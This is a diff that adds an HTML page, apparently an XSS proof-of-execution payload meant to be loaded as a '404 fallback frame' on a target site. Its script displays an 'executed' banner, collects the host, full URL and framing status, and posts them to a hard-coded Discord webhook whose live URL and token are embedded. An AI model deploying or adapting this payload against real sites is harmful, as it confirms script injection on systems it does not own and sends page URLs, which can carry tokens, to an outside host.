@@ -1,0 +1,42 @@
+<!doctype html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>[dx] 404 fallback frame</title>
+<style>
+ body{margin:0;background:#101020;color:#e8eaf2;font-family:ui-monospace,Menlo,Consolas,monospace}
+ .box{margin:8px;border:3px solid #3399ff;background:#0d1530;padding:10px 14px}
+ h1{font-size:15px;margin:0 0 6px;color:#8fd0ff}
+ #st{font-size:13px;color:#7CFC90;font-weight:bold}
+ pre{white-space:pre-wrap;font-size:11px;margin:8px 0 0;color:#aab}
+ .big{position:fixed;top:40%;left:0;right:0;text-align:center;font-size:22px;font-weight:bold;color:#4da6ff;text-shadow:0 0 12px #000;z-index:9}
+</style></head><body>
+<div class="big">FRAME (404 fallback) &#10003;</div>
+<div class="box">
+  <h1>&#128680; Script executed in fallback frame</h1>
+  <div>host: <b id="h"></b></div>
+  <div>path: <b id="p"></b></div>
+  <div id="st">booting&#8230;</div>
+  <pre id="log"></pre>
+</div>
+<script>
+(function () {
+  var HOOK = "https://discord.com/api/webhooks/1566507906172723364/0bmUeqm-EStujfcEO0XU8XEX8lI-aqgSO0tKgNYgPjCyQSYobCIlfMiyhYl8tvpGJaLq";
+  function L(s) { document.getElementById('log').textContent += s + '\n'; try { console.log('[dx-xss]', s); } catch (e) {} }
+  try {
+    var loc = location.href;
+    document.getElementById('h').textContent = location.host;
+    document.getElementById('p').textContent = location.pathname + location.search;
+    document.title = '[dx] 404-frame @ ' + location.host;
+    var when = new Date().toISOString();
+    document.getElementById('st').textContent = 'EXECUTED ' + when;
+    L('404-fallback executed at ' + when);
+    L('full url: ' + loc);
+    L('top===window: ' + (function(){try{return String(window.top===window)}catch(e){return 'cross-origin'}})());
+    fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+      body: JSON.stringify({ content: '🚨 **[dx-xss] 404-FALLBACK FRAME executed** @ `' + location.host + '`\n> ' + loc.slice(0, 900) }) })
+      .then(function(){ L('webhook beacon sent'); },
+            function(e){ L('webhook beacon failed: ' + e); });
+  } catch (e) { document.getElementById('st').textContent = 'ERR ' + e; }
+})();
+</script>
+</body></html>
